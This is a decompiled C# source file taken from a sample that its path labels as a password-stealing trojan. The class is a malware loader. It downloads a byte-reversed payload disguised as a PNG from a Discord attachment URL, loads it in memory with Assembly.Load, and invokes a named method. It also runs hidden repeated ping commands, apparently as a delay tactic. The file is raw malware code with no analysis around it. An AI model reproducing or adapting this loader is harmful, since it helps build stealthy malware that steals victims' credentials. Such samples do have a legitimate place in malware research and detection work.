// Decompiled with JetBrains decompiler
// Type: Ldkcl.CreatorQueueException
// Assembly: Ukqirzq, Version=83.0.4254.27, Culture=neutral, PublicKeyToken=null
// MVID: 6454B020-10CA-45F2-8D54-57808467D45A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-PSW.Win32.Stealer.gen-59d85b8d5e9cd2deb0142c7d2d884ca7aca4a450bc65bb0057dfbee1b169cd20.exe

using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Ldkcl
{
  internal class CreatorQueueException
  {
    private static string m_Mapper;

    internal static void SetupMapper()
    {
      List<byte> byteList;
      for (; CreatorQueueException.m_Mapper == null; CreatorQueueException.m_Mapper = Assembly.Load(byteList.ToArray()).FullName)
      {
        try
        {
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        }
        catch
        {
        }
        byteList = new List<byte>();
        foreach (byte readByte in new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/943600604876509245/943601973872181291/Ukqirzq.png").GetResponse().GetResponseStream()).ReadBytes(84641645))
          byteList.Add(readByte);
        byteList.Reverse();
      }
    }

    internal static void DestroyMapper()
    {
      foreach (Assembly assembly in Thread.GetDomain().GetAssemblies())
      {
        foreach (System.Type exportedType in assembly.GetExportedTypes())
        {
          foreach (MethodInfo method in exportedType.GetMethods())
          {
            if (method.Name == "Qfhbep")
            {
              string text = (string) method.Invoke((object) null, (object[]) null);
              if (!string.IsNullOrWhiteSpace(text))
              {
                int num = (int) MessageBox.Show(text);
              }
            }
          }
        }
      }
    }

    internal static void StopMapper()
    {
      for (int index = 0; index < 10; ++index)
        Process.Start(new ProcessStartInfo()
        {
          FileName = "cmd",
          Arguments = "/c ping yahoo.com",
          WindowStyle = ProcessWindowStyle.Hidden
        }).WaitForExit();
    }
  }
}
